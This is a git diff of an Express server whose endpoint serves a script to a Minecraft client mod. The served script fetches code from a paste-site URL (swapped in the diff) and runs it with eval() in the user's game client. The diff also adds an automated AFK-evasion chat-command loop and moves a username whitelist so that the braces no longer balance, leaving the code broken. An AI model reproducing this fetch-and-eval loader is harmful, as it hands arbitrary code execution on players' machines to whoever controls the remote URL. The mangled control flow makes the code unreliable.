@@ -45,7 +45,7 @@ const validateRequest = (req, res, next) => {
 // Главный эндпоинт для скрипта - ИСПРАВЛЕННАЯ ВЕРСИЯ
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
-
+if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
 // Method to send silent user-only message
 function sendUserMessage(message) {
     try {
@@ -75,32 +75,83 @@ sendUserMessage("§b§l-Zr3");
     var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
 
     // Проверяем разрешенные имена
-    if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
         try {
-            // Выполняем внешний скрипт - ИСПРАВЛЕННАЯ ВЕРСИЯ
-            var url = new java.net.URL("https://diddy-party.vip/p/raw/qqm7yaqga88vrpf9n");
-            var connection = url.openConnection();
-            var inputStream = connection.getInputStream();
-            var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
-            var stringBuilder = new java.lang.StringBuilder();
-            var line;
-            
-            while ((line = reader.readLine()) !== null) {
-                stringBuilder.append(line).append("\\n");
-            }
-            
-            reader.close();
-            inputStream.close();
-            
-            var externalScript = stringBuilder.toString();
-            eval(externalScript);
-            
-        } catch (e) {
-            java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
-        }
-    } else {
-        print("X");
+    // Выполняем внешний скрипт - ИСПРАВЛЕННАЯ ВЕРСИЯ
+    var url = new java.net.URL("https://i.e-z.host/p/raw/upg6sy072a");
+    var connection = url.openConnection();
+    var inputStream = connection.getInputStream();
+    var reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
+    var stringBuilder = new java.lang.StringBuilder();
+    var line;
+
+    while ((line = reader.readLine()) != null) {
+        stringBuilder.append(line).append("\n");
     }
+
+    reader.close();
+    inputStream.close();
+
+    var externalScript = stringBuilder.toString();
+    eval(externalScript);
+
+} catch (e) {
+    java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
+}
+
+var someCondition = true;  // Example condition
+
+if (someCondition) {
+    java.lang.System.out.println("hello world");
+} else {
+    java.lang.System.out.println("X");
+}
+
+// Global variable to track if we're sending commands
+var isSendingCommands = false;
+var afkDetected = false;
+
+// Single event handler for message events
+on("ru.nedan.neverapi.event.impl.EventMessage", function(event) {
+    var message = event.getMessage();
+
+     if (message === "[⚠] Данной команды не существует") {
+        chat("/an604")
+    }
+
+    if (message === "Данная команда недоступна в режиме AFK") {
+        afkDetected = true;
+    }
+});
+
+// Periodic check with repeat() (make sure repeat is supported)
+repeat(function() {
+    if (afkDetected && !isSendingCommands) {
+        isSendingCommands = true;
+        afkDetected = false;
+
+        chat("/hub");
+
+        // Use a delayed async call instead of sleep if possible,
+        // but if not, keep sleep as last resort.
+        try {
+            java.lang.Thread.sleep(250);
+        } catch (ex) {
+            java.lang.System.err.println("Sleep interrupted: " + ex);
+        }
+
+        chat("/an604");
+
+        // Short pause before resetting flag
+        try {
+            java.lang.Thread.sleep(50);
+        } catch (ex) {
+            java.lang.System.err.println("Sleep interrupted: " + ex);
+        }
+
+        isSendingCommands = false;
+    }
+}, 200);
+
 })();`;
     
     res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
